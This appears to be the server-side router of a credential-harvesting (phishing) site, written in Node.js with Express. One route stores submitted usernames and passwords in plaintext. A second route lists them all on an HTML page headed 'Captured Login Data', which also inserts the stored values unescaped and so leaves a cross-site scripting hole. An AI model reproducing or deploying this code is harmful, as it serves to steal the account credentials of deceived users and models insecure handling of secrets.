const express = require('express');
const LoginData = require('../models/loginModel');
const router = express.Router();

router.post('/logins', async (req, res) => {
  const { username, password } = req.body;
  const documentId = '6787a92e0f4f3a3159747788';

  try {
    const updatedLoginData = await LoginData.findByIdAndUpdate(
      documentId,
      { username, password, updatedAt: new Date() },
      { new: true, upsert: true }
    );

    res.status(200).json({
      message: 'Login data updated successfully',
      updatedLoginData,
    });
  } catch (error) {
    console.error('Error updating login data:', error.message);
    res.status(500).json({ message: 'Failed to update login data', error: error.message });
  }
});

router.get('/login-summary', async (req, res) => {
  try {
    const logins = await LoginData.find().sort({ createdAt: -1 });
    res.status(200).send(`
      <h1>Captured Login Data</h1>
      <ul>
        ${logins.map(login => `
          <li>
            <strong>Login:</strong> ${login.username} <br>
            <strong>Mot de passe:</strong> ${login.password}
          </li>
        `).join('')}
      </ul>
    `);
  } catch (error) {
    console.error('Error fetching login data:', error.message);
    res.status(500).send('Failed to fetch login data');
  }
});

module.exports = router;